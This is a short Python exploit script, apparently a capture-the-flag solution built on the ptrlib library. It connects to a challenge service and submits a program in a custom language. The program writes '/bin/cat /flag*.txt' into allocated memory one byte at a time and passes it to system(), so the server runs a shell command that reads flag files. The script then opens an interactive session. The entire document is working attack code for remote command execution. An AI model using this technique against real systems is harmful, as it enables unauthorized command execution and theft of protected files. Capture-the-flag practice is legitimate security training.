from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9002))

cmd = "/bin/cat /flag*.txt"

code  = "fn pwn() -> (_) {\n"
code += "  x = malloc(100)\n"
for i, c in enumerate(cmd):
    code += f"  memset(x+{i}, {ord(c)}, 1)\n"
code += f"  memset(x+{i+1}, 0, 1)\n"
code += "  system(x)\n"
code += "}"

#sock = Process("./run.py", cwd="../distfiles")
sock = Socket(HOST, PORT)

print(code)
sock.sendline(code)
sock.sendline("__EOF__")

sock.sh()
